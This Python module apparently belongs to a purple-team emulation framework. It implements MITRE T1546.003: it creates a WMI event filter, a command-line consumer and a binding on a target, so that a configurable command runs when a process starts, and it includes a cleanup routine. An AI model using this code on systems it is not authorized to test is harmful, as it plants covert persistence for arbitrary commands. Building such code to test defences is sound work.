from __future__ import annotations

import logging
from typing import Any
from uuid import uuid4

from purplestrike.models.techniques import ExecutionStatus, TechniqueResult
from purplestrike.techniques.connection import TargetConnection, command_error, get_connection
from purplestrike.techniques.scripts import ps_quote

logger = logging.getLogger(__name__)
_subscriptions: dict[str, tuple[str, str]] = {}


async def execute(target: str, parameters: dict[str, Any]) -> TechniqueResult:
    """Create WMI event subscription for persistence."""
    conn: TargetConnection | None = None
    try:
        conn = await get_connection(target)
        event_query = parameters.get("event_query") or (
            "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'notepad.exe'"
        )
        command = parameters.get("command") or "cmd.exe /c echo PurpleStrike"
        token = uuid4().hex[:10]
        filter_name = f"PurpleStrikeFilter_{token}"
        consumer_name = f"PurpleStrikeConsumer_{token}"
        _subscriptions[target] = (filter_name, consumer_name)
        result = await conn.run_ps(
            "$ErrorActionPreference = 'Stop'; "
            "$f = Set-WmiInstance -Namespace root/subscription -Class __EventFilter "
            f"-Arguments @{{Name={ps_quote(filter_name)}; EventNamespace='root/cimv2'; "
            f"QueryLanguage='WQL'; Query={ps_quote(event_query)}}}; "
            "$c = Set-WmiInstance -Namespace root/subscription "
            "-Class CommandLineEventConsumer "
            f"-Arguments @{{Name={ps_quote(consumer_name)}; "
            f"CommandLineTemplate={ps_quote(command)}}}; "
            "Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding "
            "-Arguments @{Filter=$f; Consumer=$c}"
        )
        return TechniqueResult(
            technique_id="T1546.003",
            success=result.success,
            output=result.stdout[:4096],
            error=result.stderr[:1024] if not result.success else None,
            execution_status=ExecutionStatus.SUCCESS if result.success else ExecutionStatus.FAILURE,
        )
    except Exception as e:
        logger.error(f"T1546.003 execution failed: {e}")
        return TechniqueResult(
            technique_id="T1546.003",
            success=False,
            error=str(e),
            execution_status=ExecutionStatus.FAILURE,
        )
    finally:
        if conn:
            await conn.disconnect()


async def cleanup(target: str) -> None:
    """Reverse any changes made during execution."""
    conn: TargetConnection | None = None
    try:
        names = _subscriptions.get(target)
        if names is None:
            return
        filter_name, consumer_name = names
        conn = await get_connection(target)
        result = await conn.run_ps(
            "Get-WmiObject -Namespace root\\subscription "
            "-Class __FilterToConsumerBinding | "
            f"Where-Object {{ $_.Filter -like '*Name=\"{filter_name}\"*' }} "
            "| Remove-WmiObject; "
            "Get-WmiObject -Namespace root\\subscription "
            "-Class CommandLineEventConsumer -Filter "
            f"\"Name='{consumer_name}'\" "
            "| Remove-WmiObject; "
            "Get-WmiObject -Namespace root\\subscription "
            "-Class __EventFilter -Filter "
            f"\"Name='{filter_name}'\" "
            "| Remove-WmiObject"
        )
        if not result.success:
            raise RuntimeError(command_error(result))
        _subscriptions.pop(target, None)
    except Exception as e:
        logger.warning(f"T1546.003 cleanup failed: {e}")
    finally:
        if conn:
            await conn.disconnect()
